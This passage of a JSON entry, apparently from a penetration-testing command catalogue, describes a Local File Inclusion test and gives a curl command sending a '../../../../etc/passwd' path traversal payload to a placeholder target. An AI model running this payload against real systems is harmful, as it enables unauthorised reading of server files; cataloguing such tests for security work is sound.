    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl 'http://<target>/page?file=../../../../etc/passwd'",
    "name": "Local File Inclusion (LFI)",
    "description": "Tests for path traversal / local file inclusion to read server files.",
    "arguments": {
      "file parameter": "Path traversal payload"
